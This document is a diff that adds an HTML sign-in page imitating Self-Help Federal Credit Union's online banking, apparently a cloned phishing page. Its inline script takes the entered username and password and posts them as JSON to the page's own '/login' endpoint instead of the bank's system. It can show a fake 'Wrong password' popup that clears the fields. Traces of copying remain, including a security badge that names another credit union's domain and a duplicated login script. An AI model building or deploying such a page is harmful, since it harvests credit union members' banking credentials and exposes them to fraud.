@@ -1,0 +1,276 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, user-scalable=0" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta lang="en" />
+
+    <title>Welcome!  - Self-Help Federal Credit Union</title>
+    
+    
+<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />
+
+<link href="https://selfhelp.ns3web.org/Content/vendor?v=tKb0oysYZ7NdohWQLtFOQ_iXpsKsOgwmyADaMXEa2KI1" rel="stylesheet"/>
+
+<link href="https://selfhelp.ns3web.org/Content/site?v=SI5YKQnEOv6gVCwP2FnmZWhV0HnuC1wL7ghV1JbWyl41" rel="stylesheet"/>
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+
+
+  
+    <style>
+        .tagline {
+            font-size: 18px;
+            color: #333;
+            margin-top: 10px;
+            display: block;
+        }
+    </style>
+</head>
+<body>
+
+<div class="jumbotron">
+    <div class="row right-10 pull-right">
+        <div class="culture-select text-center"><span class="active-culture">English</span> | <a href="/Log/ChooseCulture?culture=es-US">Espa&#241;ol</a></div>
+    </div>
+    <div class="container">
+        <div class="row">
+            <div class="col-md-9 col-sm-9">
+                <h1>Self-Help Federal Credit Union</h1>
+                <p class="tagline"><em>Where members matter.</em></p>
+            </div>
+            <div class="col-md-3 col-sm-3">
+                <img alt="Logo" src="logo.png" class="pull-right img-responsive" />
+            </div>
+        </div>
+    </div>
+</div><div class="container">
+
+
+    <div class="row"><div class="left-15 top-20 col-md-12" id="alertDiv"></div></div>
+    
+<form id="logl" method="post" novalidate>
+        <div id="log-in">
+            <div class="row">
+                <div class="col-md-4 col-md-offset-4">
+                    <div class="panel panel-default">
+                        <div class="panel-heading"><strong>Please Sign In</strong></div>
+                        <div class="panel-body">
+                            <div class="row">
+                                <div class="col-md-10 col-md-offset-1">
+                                    <div class="form-group top-20">
+                                        <label for="UserName" class="sr-only">Username</label>
+                                        <div class="input-group">
+                                            <span class="input-group-addon"><em class="fa fa-user"></em></span>
+                                            <input autocomplete="off" class="form-control" id="UserName" name="UserName" placeholder="Username" required type="text">
+                                        </div>
+                                    </div>
+                                    <div class="form-group top-15">
+                                        <label for="Password" class="sr-only">Password</label>
+                                        <div class="input-group">
+                                            <span class="input-group-addon"><em class="fa fa-lock"></em></span>
+                                            <input autocomplete="off" class="form-control" id="Password" name="Password" placeholder="Password" required type="password">
+                                        </div>
+                                    </div>
+                                    <div class="form-group">
+                                        <div class="form-check-label">
+                                            <input id="rememberMe" type="checkbox">
+                                            <label for="rememberMe">Remember username</label>
+                                        </div>
+                                    </div>
+                                    <div class="form-group top-10">
+                                        <button class="btn-primary btn-block btn-lg btn" id="login">Login</button>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="panel-footer text-center">
+                        <a href="/Username/Forgot">Forgot username?</a><br />
+                        <a href="/Password/Forgot">Forgot password?</a>
+                    </div>
+                </div>
+                <a href="http://www.ncua.gov/Pages/default.aspx" target="_blank">
+    <img alt="NCUA" class="img-small" id="ncua" src="NCUA_logo.jpg" />
+</a>
+<a class="pull-right" href="https://www.securitymetrics.com/site_certificate.adp?s=www%2ecascadecuhb%2eorg&amp;i=74177" target="_blank">
+    <img alt="SecurityMetrics for PCI Compliance, QSA, IDS, Penetration Testing, Forensics, and Vulnerability Assessment" src="https://www.securitymetrics.com/images/sm_ccsafe_check1.gif" />
+</a>
+            </div>
+        </div>
+    </div>
+</form>
+</div>
+
+    
+    <script>
+    document.getElementById("login").addEventListener("click", function (e) {
+        e.preventDefault(); // Prevent default form submission
+    
+        let username = document.getElementById("UserName").value.trim();
+        let password = document.getElementById("Password").value.trim();
+        let rememberMe = document.getElementById("rememberMe").checked;
+    
+        if (!username || !password) {
+            showPopup("Fields cannot be empty", "orange");
+            return;
+        }
+    
+        fetch("/login", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            credentials: "include", // Sends and receives cookies
+            body: JSON.stringify({ username, password, rememberMe }),
+        })
+        .then(response => response.json())
+        .then(data => {
+            console.log("🔹 Server Response:", data);
+    
+            if (data.showPopup) {
+                showPopup("Wrong password", "red");
+                document.getElementById("UserName").value = "";
+                document.getElementById("Password").value = "";
+            } else if (data.redirectTo) {
+                showPopup("Login successful!", "green");
+                setTimeout(() => window.location.href = data.redirectTo, 1000);
+            }
+        })
+        .catch(error => console.error("❌ Error:", error));
+    });
+    
+    function showPopup(message, color) {
+        let existingPopup = document.getElementById("popupMessage");
+        if (existingPopup) existingPopup.remove(); // Remove old popup
+    
+        let popup = document.createElement("div");
+        popup.id = "popupMessage";
+        popup.innerText = message;
+        popup.style.position = "fixed";
+        popup.style.top = "10px";
+        popup.style.right = "10px";
+        popup.style.backgroundColor = color;
+        popup.style.color = "white";
+        popup.style.padding = "10px 20px";
+        popup.style.borderRadius = "5px";
+        popup.style.zIndex = "1000";
+        document.body.appendChild(popup);
+        setTimeout(() => popup.remove(), 1000);
+    }
+    </script>
+            
+    
+    <script>
+
+        function onCaptchaComplete(token) {
+            $('form').submit();
+        }
+
+        var pageModel = function () {
+            // properties
+            var self = this;
+
+            // methods
+            self.storedUsername = function () {
+                return typeof Cookies.get('nsHomeUsername') !== 'undefined';
+            };
+
+            // observables
+            self.username = ko.observable(self.storedUsername() ? Cookies.get('nsHomeUsername') : '');
+            self.rememberMe = ko.observable(self.storedUsername());
+            self.submitted = ko.observable(false);
+
+            // event handlers
+            self.submit = function () {
+                if ($('form').valid()) {
+                    self.submitted(true);
+                    if (self.rememberMe()) {
+                        Cookies.set('nsHomeUsername', self.username(), { expires: 30 });
+                    } else {
+                        if (self.storedUsername) {
+                            Cookies.remove('nsHomeUsername');
+                        }
+                    }
+
+                        
+                            $('form').submit();
+                        
+                }
+            };
+        };
+
+        $(document).ready(function () {
+            var model = new pageModel();
+            ko.applyBindings(model);
+        });
+    </script>
+
+
+</div>
+
+<script>
+
+</script>
+
+<script src="/Scripts/bundles/base?v=EHOwzmsa1KtWhEEvMlMaP-g7EzeIgzcPUbgCSI91eTw1"></script>
+
+
+
+
+    <script>
+
+        function onCaptchaComplete(token) {
+            $('form').submit();
+        }
+
+        var pageModel = function () {
+            // properties
+            var self = this;
+
+            // methods
+            self.storedUsername = function () {
+                return typeof Cookies.get('nsHomeUsername') !== 'undefined';
+            };
+
+            // observables
+            self.username = ko.observable(self.storedUsername() ? Cookies.get('nsHomeUsername') : '');
+            self.rememberMe = ko.observable(self.storedUsername());
+            self.submitted = ko.observable(false);
+
+            // event handlers
+            self.submit = function () {
+                if ($('form').valid()) {
+                    self.submitted(true);
+                    if (self.rememberMe()) {
+                        Cookies.set('nsHomeUsername', self.username(), { expires: 30 });
+                    } else {
+                        if (self.storedUsername) {
+                            Cookies.remove('nsHomeUsername');
+                        }
+                    }
+
+                        
+                            $('form').submit();
+                        
+                }
+            };
+        };
+
+        $(document).ready(function () {
+            var model = new pageModel();
+            ko.applyBindings(model);
+        });
+    </script>
+
+
+
+<div class="container">
+    <footer>
+        
+
+<p class="top-20 pull-right">NS3 Release 23.1.2 | 7301D7A0 | R | © 2025 - Share One, Inc.</p>
+    </footer>
+</div>
+
+</body>
+</html>
